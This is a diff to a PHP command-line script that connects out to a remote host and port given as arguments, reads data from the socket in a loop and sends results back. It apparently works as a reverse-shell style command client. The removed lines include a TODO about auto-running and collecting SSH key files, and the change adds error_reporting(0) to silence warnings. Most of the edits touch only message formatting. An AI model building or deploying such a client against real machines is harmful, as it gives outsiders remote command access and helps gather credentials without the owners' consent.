@@ -1,8 +1,7 @@
 #!/usr/bin/php -q
 <?php
 
-	// TODO: autorun
-	// cat ~/.ssh/*.pub >> ./keys.txt
+	error_reporting(0);	// suppress warnings
 
 	set_time_limit(0);
 	ob_implicit_flush(1);
@@ -16,33 +15,30 @@
 
 
 	if(count($opts) < 2){
-		die("Assign remote addr. and port..\n");
+		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
 	}
 
 	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
 	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
-	     die("\33[91m[!] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\33[0m\n");
+	     die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
 	}
 
-
-	echo "Connecting to [".$addr.":".$port."]..\n";
+	echo "Connecting to [".$addr.":".$port."]...\n";
 
 	if ((@$result = socket_connect($socket, $addr, $port)) === false){
-	    die("\33[91m[!] socket_connect failed.\nreason: (".$result.") " .socket_strerror(socket_last_error($socket))."\33[0m\n");
+	    die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
 	} 
-		
 
-	echo "\33[32mConnected to host [".$addr.":".$port."].\33[0m\n";
-	echo "\33[36mReading response:\33[0m\n\n";
+	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
 
 	while (true) {
 	$now = date('d/m H:i:s');
 
 	    if(($recv = socket_read($socket, 1024)) === false || $recv === "")
 	    {
-	    	echo "\33[91m[exit] Empty stream..\33[0m\n";
+	    	echo "[\33[91mexit\33[0m] Empty stream..\n";
 	    	break;
 	    }
 	    else
@@ -62,7 +58,7 @@
 
 	    		if(socket_write($socket, $result, strlen($result)) === false)
 	    		{	
-		        	echo "\33[91mCommand not set: ".socket_strerror(socket_last_error($socket))."\33[0m\n";
+		        	echo "\33[91mCommand not set\33[0m: ".socket_strerror(socket_last_error($socket))."\n";
 		        }
 	    	}
 
